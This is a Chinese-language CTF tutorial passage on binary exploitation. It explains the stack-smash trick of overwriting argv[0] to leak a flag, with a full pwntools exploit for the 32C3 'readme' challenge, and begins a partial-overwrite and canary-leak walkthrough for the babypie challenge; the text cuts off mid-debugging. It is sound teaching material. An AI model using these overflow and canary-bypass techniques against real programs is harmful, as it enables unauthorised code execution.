<h2 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h2><h3 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h3><p>在程序加了canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下</p>
<pre class="line-numbers language-C"><code class="language-C">void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 <code>__fortify_fail</code> 函数中就会输出我们想要的信息。</p>
<h3 id="32C3-CTF-readme"><a href="#32C3-CTF-readme" class="headerlink" title="32C3 CTF readme"></a>32C3 CTF readme</h3><p>这里，我们以 2015 年 32C3 CTF readme 为例进行介绍，该题目在 jarvisoj 上有复现。</p>
<h4 id="确定保护"><a href="#确定保护" class="headerlink" title="确定保护"></a>确定保护</h4><p>可以看出程序为 64 位，主要开启了 Canary 保护以及 NX 保护，以及 FORTIFY 保护。</p>
<pre class="line-numbers language-shell"><code class="language-shell">➜  stacksmashes git:(master) ✗ checksec smashes
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="分析程序-1"><a href="#分析程序-1" class="headerlink" title="分析程序"></a>分析程序</h4><p>ida 看一下</p>
<pre class="line-numbers language-c"><code class="language-c">__int64 <span class="token function">sub_4007E0</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax@1</span>
  __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx@2</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax@3</span>
  __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+0h] [bp-128h]@1</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [sp+108h] [bp-20h]@1</span>

  v5 <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">MK_FP</span><span class="token punctuation">(</span>__FS__<span class="token punctuation">,</span> <span class="token number">40LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"Hello!\nWhat's your name? "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">LODWORD</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">_IO_gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v0 <span class="token punctuation">)</span>
LABEL_9<span class="token punctuation">:</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"Nice to meet you, %s.\nPlease overwrite the flag: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    v2 <span class="token operator">=</span> <span class="token function">_IO_getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
      <span class="token keyword">goto</span> LABEL_9<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    byte_600D20<span class="token punctuation">[</span>v1<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token string">' '</span> <span class="token punctuation">)</span>
      <span class="token keyword">goto</span> LABEL_8<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">0x600D20LL</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> v1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
LABEL_8<span class="token punctuation">:</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Thank you, bye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token operator">*</span><span class="token function">MK_FP</span><span class="token punctuation">(</span>__FS__<span class="token punctuation">,</span> <span class="token number">40LL</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>很显然，程序在 <code>_IO_gets((__int64)&amp;v4)</code>; 存在栈溢出。</p>
<p>此外，程序中还提示要 overwrite flag。而且发现程序很有意思的在 while 循环之后执行了这条语句</p>
<pre class="line-numbers language-C"><code class="language-C">  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>又看了看对应地址的内容，可以发现如下内容，说明程序的flag就在这里。</p>
<pre><code>.data:0000000000600D20 ; char aPctfHereSTheFl[]
.data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0</code></pre><p>但是如果我们直接利用栈溢出输出该地址的内容是不可行的，这是因为我们读入的内容 <code>byte_600D20[v1++] = v2;</code>也恰恰就是该块内存，这会直接将其覆盖掉，这时候我们就需要利用一个技巧了</p>
<ul>
<li>在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find来进行查找。</li>
</ul>
<h4 id="确定-flag-地址"><a href="#确定-flag-地址" class="headerlink" title="确定 flag 地址"></a>确定 flag 地址</h4><p>我们把断点下载 memset 函数处，然后读取相应的内容如下</p>
<pre class="line-numbers language-asm"><code class="language-asm">gef➤  c
Continuing.
Hello!
What's your name? qqqqqqq
Nice to meet you, qqqqqqq.
Please overwrite the flag: 222222222

Breakpoint 1, __memset_avx2 () at ../sysdeps/x86_64/multiarch/memset-avx2.S:38
38    ../sysdeps/x86_64/multiarch/memset-avx2.S: 没有那个文件或目录.
─────────────────────────────────────[ code:i386:x86-64 ]────
   0x7ffff7b7f920 <__memset_chk_avx2+0> cmp    rcx, rdx
   0x7ffff7b7f923 <__memset_chk_avx2+3> jb     0x7ffff7b24110 <__GI___chk_fail>
   0x7ffff7b7f929                  nop    DWORD PTR [rax+0x0]
 → 0x7ffff7b7f930 <__memset_avx2+0> vpxor  xmm0, xmm0, xmm0
   0x7ffff7b7f934 <__memset_avx2+4> vmovd  xmm1, esi
   0x7ffff7b7f938 <__memset_avx2+8> lea    rsi, [rdi+rdx*1]
   0x7ffff7b7f93c <__memset_avx2+12> mov    rax, rdi
───────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffda38', 'l8']
8
0x00007fffffffda38│+0x00: 0x0000000000400878  →   mov edi, 0x40094e     ← $rsp
0x00007fffffffda40│+0x08: 0x0071717171717171 ("qqqqqqq"?)
0x00007fffffffda48│+0x10: 0x0000000000000000
0x00007fffffffda50│+0x18: 0x0000000000000000
0x00007fffffffda58│+0x20: 0x0000000000000000
0x00007fffffffda60│+0x28: 0x0000000000000000
0x00007fffffffda68│+0x30: 0x0000000000000000
0x00007fffffffda70│+0x38: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7b7f930 → Name: __memset_avx2()
[#1] 0x400878 → mov edi, 0x40094e
──────────────────────────────────────────────────────────────────────────────
gef➤  find 22222
Argument required (expression to compute).
gef➤  find '22222'
No symbol "22222" in current context.
gef➤  grep '22222'
[+] Searching '22222' in memory
[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x600000-0x601000), permission=rw-
  0x600d20 - 0x600d3f  →   "222222222's the flag on server}" 
[+] In '[heap]'(0x601000-0x622000), permission=rw-
  0x601010 - 0x601019  →   "222222222" 
gef➤  grep PCTF
[+] Searching 'PCTF' in memory
[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x400000-0x401000), permission=r-x
  0x400d20 - 0x400d3f  →   "PCTF{Here's the flag on server}" <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看出我们读入的 2222 已经覆盖了 0x600d20 处的 flag，但是我们在内存的 0x400d20 处仍然找到了这个flag的备份，所以我们还是可以将其输出。这里我们已经确定了 flag 的地址。</p>
<h4 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h4><p>下面，我们确定 argv[0] 距离读取的字符串的偏移。</p>
<p>首先下断点在 main 函数入口处，如下</p>
<pre class="line-numbers language-asm"><code class="language-asm">gef➤  b *0x00000000004006D0
Breakpoint 1 at 0x4006d0
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes 

Breakpoint 1, 0x00000000004006d0 in ?? ()
 code:i386:x86-64 ]────
     0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
     0x4006c6 <_IO_gets@plt+6> push   0x9
     0x4006cb <_IO_gets@plt+11> jmp    0x400620
 →   0x4006d0                  sub    rsp, 0x8
     0x4006d4                  mov    rdi, QWORD PTR [rip+0x200665]        # 0x600d40 <stdout>
     0x4006db                  xor    esi, esi
     0x4006dd                  call   0x400660 <setbuf@plt>
──────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb78', 'l8']
8
0x00007fffffffdb78│+0x00: 0x00007ffff7a2d830  →  <__libc_start_main+240> mov edi, eax     ← $rsp
0x00007fffffffdb80│+0x08: 0x0000000000000000
0x00007fffffffdb88│+0x10: 0x00007fffffffdc58  →  0x00007fffffffe00b  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]"
0x00007fffffffdb90│+0x18: 0x0000000100000000
0x00007fffffffdb98│+0x20: 0x00000000004006d0  →   sub rsp, 0x8
0x00007fffffffdba0│+0x28: 0x0000000000000000
0x00007fffffffdba8│+0x30: 0x48c916d3cf726fe3
0x00007fffffffdbb0│+0x38: 0x00000000004006ee  →   xor ebp, ebp
──────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x4006d0 → sub rsp, 0x8
[#1] 0x7ffff7a2d830 → Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48)
---Type <return> to continue, or q <return> to quit---
[#2] 0x400717 → hlt 
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看出 0x00007fffffffe00b 指向程序名，其自然就是 argv[0]，所以我们修改的内容就是这个地址。同时0x00007fffffffdc58 处保留着该地址，所以我们真正需要的地址是 0x00007fffffffdc58。</p>
<p>此外，根据汇编代码</p>
<pre class="line-numbers language-asm"><code class="language-asm">.text:00000000004007E0                 push    rbp
.text:00000000004007E1                 mov     esi, offset aHelloWhatSYour ; "Hello!\nWhat's your name? "
.text:00000000004007E6                 mov     edi, 1
.text:00000000004007EB                 push    rbx
.text:00000000004007EC                 sub     rsp, 118h
.text:00000000004007F3                 mov     rax, fs:28h
.text:00000000004007FC                 mov     [rsp+128h+var_20], rax
.text:0000000000400804                 xor     eax, eax
.text:0000000000400806                 call    ___printf_chk
.text:000000000040080B                 mov     rdi, rsp
.text:000000000040080E                 call    __IO_gets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们可以确定我们读入的字符串的起始地址其实就是调用 <code>__IO_gets</code> 之前的 rsp，所以我们把断点下在 call 处，如下</p>
<pre class="line-numbers language-asm"><code class="language-asm">gef➤  b *0x000000000040080E
Breakpoint 2 at 0x40080e
gef➤  c
Continuing.
Hello!
What's your name? 
Breakpoint 2, 0x000000000040080e in ?? ()
──────────────────────────[ code:i386:x86-64 ]────
     0x400804                  xor    eax, eax
     0x400806                  call   0x4006b0 <__printf_chk@plt>
     0x40080b                  mov    rdi, rsp
 →   0x40080e                  call   0x4006c0 <_IO_gets@plt>
   ↳    0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
        0x4006c6 <_IO_gets@plt+6> push   0x9
        0x4006cb <_IO_gets@plt+11> jmp    0x400620
        0x4006d0                  sub    rsp, 0x8
──────────────────[ stack ]────
['0x7fffffffda40', 'l8']
8
0x00007fffffffda40│+0x00: 0x0000ff0000000000     ← $rsp, $rdi
0x00007fffffffda48│+0x08: 0x0000000000000000
0x00007fffffffda50│+0x10: 0x0000000000000000
0x00007fffffffda58│+0x18: 0x0000000000000000
0x00007fffffffda60│+0x20: 0x0000000000000000
0x00007fffffffda68│+0x28: 0x0000000000000000
0x00007fffffffda70│+0x30: 0x0000000000000000
0x00007fffffffda78│+0x38: 0x0000000000000000
────────────────────────────────────────────[ trace ]────
[#0] 0x40080e → call 0x4006c0 <_IO_gets@plt>
──────────────────────────────────────────────────────────
gef➤  print $rsp
$1 = (void *) 0x7fffffffda40<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看出rsp的值为0x7fffffffda40，那么相对偏移为</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">0x00007fffffffdc58</span><span class="token operator">-</span><span class="token number">0x7fffffffda40</span>
<span class="token number">536</span>
<span class="token operator">>></span><span class="token operator">></span> hex<span class="token punctuation">(</span><span class="token number">536</span><span class="token punctuation">)</span>
<span class="token string">'0x218'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="利用程序"><a href="#利用程序" class="headerlink" title="利用程序"></a>利用程序</h4><p>我们构造利用程序如下</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
smash <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./smashes'</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn.jarvisoj.com'</span><span class="token punctuation">,</span> <span class="token number">9877</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./smashes'</span><span class="token punctuation">)</span>
argv_addr <span class="token operator">=</span> <span class="token number">0x00007fffffffdc58</span>
name_addr <span class="token operator">=</span> <span class="token number">0x7fffffffda40</span>
flag_addr <span class="token operator">=</span> <span class="token number">0x600D20</span>
another_flag_addr <span class="token operator">=</span> <span class="token number">0x400d20</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>argv_addr <span class="token operator">-</span> name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>another_flag_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name? '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'flag: '</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'bb'</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里我们直接就得到了 flag，没有出现网上说的得不到 flag 的情况。</p>
<h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><ul>
<li>2018 网鼎杯 - guess</li>
</ul>
<h2 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h2><p>partial overwrite 这种技巧在很多地方都适用, 这里先以栈上的 partial overwrite 为例来介绍这种思想。</p>
<p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。</p>
<h3 id="2018-安恒杯-babypie"><a href="#2018-安恒杯-babypie" class="headerlink" title="2018-安恒杯-babypie"></a>2018-安恒杯-babypie</h3><p>以安恒杯 2018 年 7 月月赛的 babypie 为例分析这一种利用技巧, 题目的 binary 放在了 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/partial_overwrite" target="_blank" rel="noopener">ctf-challenge</a> 中</p>
<h4 id="确定保护-1"><a href="#确定保护-1" class="headerlink" title="确定保护"></a>确定保护</h4><pre class="line-numbers language-bash"><code class="language-bash">babypie: ELF 64-bit LSB shared object, x86-64, version 1 <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="token keyword">for</span> GNU/Linux 2.6.32, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>64 位动态链接的文件, 开启了 PIE 保护和栈溢出保护</p>
<h4 id="分析程序-2"><a href="#分析程序-2" class="headerlink" title="分析程序"></a>分析程序</h4><p>IDA 中看一下, 很容易就能发现漏洞点, 两处输入都有很明显的栈溢出漏洞, 需要注意的是在输入之前, 程序对栈空间进行了清零, 这样我们就无法通过打印栈上信息来 leak binary 或者 libc 的基址了</p>
<pre class="line-numbers language-C"><code class="language-C">__int64 sub_960()
{
  char buf[40]; // [rsp+0h] [rbp-30h]
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  *(_OWORD *)buf = 0uLL;
  *(_OWORD *)&buf[16] = 0uLL;
  puts("Input your Name:");
  read(0, buf, 0x30uLL);                        // overflow
  printf("Hello %s:\n", buf, *(_QWORD *)buf, *(_QWORD *)&buf[8], *(_QWORD *)&buf[16], *(_QWORD *)&buf[24]);
  read(0, buf, 0x60uLL);                        // overflow
  return 0LL;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>同时也发现程序中给了能直接 get shell 的函数</p>
<pre class="line-numbers language-asm"><code class="language-asm">.text:0000000000000A3E getshell        proc near
.text:0000000000000A3E ; __unwind { .text:0000000000000A3E                 push    rbp
.text:0000000000000A3F                 mov     rbp, rsp
.text:0000000000000A42                 lea     rdi, command    ; "/bin/sh"
.text:0000000000000A49                 call    _system
.text:0000000000000A4E                 nop
.text:0000000000000A4F                 pop     rbp
.text:0000000000000A50                 retn
.text:0000000000000A50 ; } // starts at A3E
.text:0000000000000A50 getshell        endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样我们只要控制 rip 到该函数即可</p>
<h4 id="leak-canary"><a href="#leak-canary" class="headerlink" title="leak canary"></a>leak canary</h4><p>在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。</p>
<p>为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 (+ 1 是为了覆盖 canary 的最低位为非 0 的值, printf 使用 %s 时, 遇到 \0 结束, 覆盖 canary 低位为非 0 值时, canary 就可以被 printf 打印出来了)</p>
<pre class="line-numbers language-asm"><code class="language-asm">Breakpoint 1, 0x0000557c8443aa08 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7f1898a64690 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x30
 RDI  0x557c8443ab15 ◂— insb   byte ptr [rdi], dx /* 'Hello %s:\n' */
 RSI  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0x7f1898f1d700 ◂— 0x7f1898f1d700
 R9   0x7f1898f1d700 ◂— 0x7f1898f1d700
 R10  0x37b
 R11  0x246
 R12  0x557c8443a830 ◂— xor    ebp, ebp
 R13  0x7ffd97aa0540 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15
 RSP  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
 RIP  0x557c8443aa08 ◂— call   0x557c8443a7e0
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
 ► 0x557c8443aa08    call   0x557c8443a7e0

   0x557c8443aa0d    lea    rax, [rbp - 0x30]
   0x557c8443aa11    mov    edx, 0x60
   0x557c8443aa16    mov    rsi, rax
   0x557c8443aa19    mov    edi, 0
   0x557c8443aa1e    call   0x557c8443a7f0

   0x557c8443aa23    mov    eax, 0
   0x557c8443aa28    mov    rcx, qword ptr [rbp - 8]
   0x557c8443aa2c    xor    rcx, qword ptr fs:[0x28]
   0x557c8443aa35    je     0x557c8443aa3c

   0x557c8443aa37    call   0x557c8443a7c0
────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsi rsp  0x7ffd97aa0410 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓
05:0028│          0x7ffd97aa0438 ◂— 0xb3012605fc402a61
06:0030│ rbp      0x7ffd97aa0440 —▸ 0x7ffd97aa0460 —▸ 0x557c8443aa80 ◂— push   r15
07:0038│          0x7ffd97aa0448 —▸ 0x557c8443aa6a ◂— mov    eax, 0
Breakpoint *(0x557c8443a000+0xA08)
pwndbg> canary
$1 = 0
canary : 0xb3012605fc402a00
pwndbg><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>canary 在 rbp - 0x8 的位置上, 可以看出此时 canary 的低位已经被覆盖为 0x61, 这样只要接收 ‘a’ * (0x30 - 0x8 + 1) 后的 7 位, 再加上最低位的 ‘\0’, 我们就恢复出程序的 canary 了</p>
<h4 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h4><p>有了 canary 后, 就可以通过第二次的栈溢出来改写返回地址了, 控制返回地址到 getshell 函数即可, 我们先看一下没溢出时的返回地址</p>
<pre class="line-numbers language-asm"><code class="language-asm">0x000055dc43694a1e in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 RAX  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 RBX  0x0
 RCX  0x7f206c6696f0 (__write_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x60
 RDI  0x0
 RSI  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0x7f206cb22700 ◂— 0x7f206cb22700
 R9   0x3e
 R10  0x73
 R11  0x246
 R12  0x55dc43694830 ◂— xor    ebp, ebp
 R13  0x7fff9aa3b050 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15
 RSP  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
 RIP  0x55dc43694a1e ◂— call   0x55dc436947f0
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
   0x55dc43694a08    call   0x55dc436947e0

   0x55dc43694a0d    lea    rax, [rbp - 0x30]
   0x55dc43694a11    mov    edx, 0x60
   0x55dc43694a16    mov    rsi, rax
   0x55dc43694a19    mov    edi, 0
 ► 0x55dc43694a1e    call   0x55dc436947f0

   0x55dc43694a23    mov    eax, 0
   0x55dc43694a28    mov    rcx, qword ptr [rbp - 8]
   0x55dc43694a2c    xor    rcx, qword ptr fs:[0x28]
   0x55dc43694a35    je     0x55dc43694a3c

   0x55dc43694a37    call   0x55dc436947c0
────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rax rsi rsp  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓
05:0028│              0x7fff9aa3af48 ◂— 0xbfe0cfbabccd2861
06:0030│ rbp          0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15
07:0038│              0x7fff9aa3af58 —▸ 0x55dc43694a6a ◂— mov    eax, 0
pwndbg> x/10i (0x0A3E+0x55dc43694000) 
   0x55dc43694a3e:    push   rbp
   0x55dc43694a3f:    mov    rbp,rsp
   0x55dc43694a42:    lea    rdi,[rip+0xd7]        # 0x55dc43694b20
   0x55dc43694a49:    call   0x55dc436947d0
   0x55dc43694a4e:    nop
